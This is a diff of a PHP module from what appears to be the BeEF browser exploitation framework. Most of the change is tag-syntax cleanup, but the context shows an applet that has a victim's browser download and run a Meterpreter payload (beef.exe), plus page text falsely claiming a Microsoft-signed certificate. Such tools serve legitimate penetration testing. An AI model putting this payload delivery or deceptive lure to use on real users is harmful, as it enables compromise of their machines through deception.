@@ -1,5 +1,5 @@
-<?
-    // Copyright (c) 2006-2009, Wade Alcorn 
+<?php
+    // Copyright (c) 2006-2010, Wade Alcorn 
     // All Rights Reserved
     // wade@bindshell.net - http://www.bindshell.net
     //
@@ -14,7 +14,7 @@
 <script>
 	function get_b64_code_msf_applet() {
 		// javascript is loaded from a file - it could be hard coded
-		var b64code = '<? echo get_b64_file(JS_FILE); ?>';
+		var b64code = '<?php echo get_b64_file(JS_FILE); ?>';
 
 		// do some super escaping 		
 		msfcmd_str = document.myform.msfcmd.value;
@@ -46,7 +46,7 @@ The certificate is self-signed by the Microsoft Corporation.<br><br>
 <div id="module_subsection">
 	<form name="myform">
                 <div id="module_subsection_header">URL to Download Meterpreter Payload</div>
-                <input type="text" name="msfcmd" value="http://<?=$_SERVER['SERVER_NAME']?>/beef/beef.exe"/>
+                <input type="text" name="msfcmd" value="http://<?php echo$_SERVER['SERVER_NAME']?>/beef/beef.exe"/>
 		<input class="button" type="button" value=" Set Autorun " onClick="javascript:set_autorun()"/>
 		<input class="button" type="button" value=" Send Now " onClick="javascript:send_now()"/>
 	</form>
